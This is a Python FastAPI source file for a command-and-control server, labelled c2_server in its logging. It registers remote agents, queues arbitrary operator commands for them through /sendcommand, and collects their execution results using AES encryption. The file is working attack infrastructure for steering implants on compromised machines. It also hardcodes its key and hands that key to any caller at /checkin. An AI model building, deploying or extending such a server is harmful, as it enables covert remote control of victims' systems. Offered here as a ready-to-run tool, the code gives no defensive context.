from fastapi import FastAPI, HTTPException
import json
from pydantic import BaseModel
from typing import Dict
import logging
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import uvicorn

app = FastAPI()
agents: Dict[str, Dict] = {}

# Configuring logging
logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

# Load AES Key (Ensure it is 32 bytes for AES-256)
key_b64 = "ywD3S70cYF56DLw3GHYA9MzCflWAMcljQKoeKXbanqc="  # Replace with your actual key
key = base64.b64decode(key_b64)

def check_key_length(key: bytes) -> bytes:
    if len(key) not in [16, 24, 32]:
        raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
    return key

def encrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    encrypted_data = base64.b64encode(iv + ct_bytes).decode('utf-8')
    return encrypted_data

def decrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    try:
        raw_data = base64.b64decode(data)
        iv, ct = raw_data[:16], raw_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

@app.post("/checkin")
def checkin(request: CheckinRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        agents[agent_id] = {"commands": []}
        logging.info(f"New agent registered: {agent_id}")

    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        response = encrypt_data(command, key)
    else:
        response = encrypt_data("NoCommand", key)

    return {"key": key_b64, "data": response}

@app.post("/result")
def result(request: ResultRequest):
    agent_id = request.AgentID
    try:
        decrypted_result = decrypt_data(request.Result, key)
        message = f"Agent {agent_id} executed command with result: {decrypted_result}"
        logging.info(message)
        print(message, flush=True)  # Print to console for real-time monitoring
    except Exception as e:
        logging.error(f"Failed to process result from agent {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    return {"Status": "OK"}

@app.get("/list_agents")
def list_agents():
    return {"agents": [{"AgentID": agent_id} for agent_id in agents]}

@app.post("/sendcommand")
def send_command(request: CommandRequest):
    agent_id = request.AgentID
    command = request.Command
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        logging.info(f"Command sent to agent {agent_id}: {command}")
        return {"Status": "Command sent"}
    raise HTTPException(status_code=404, detail="Agent not found")

def run_server():
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    run_server()

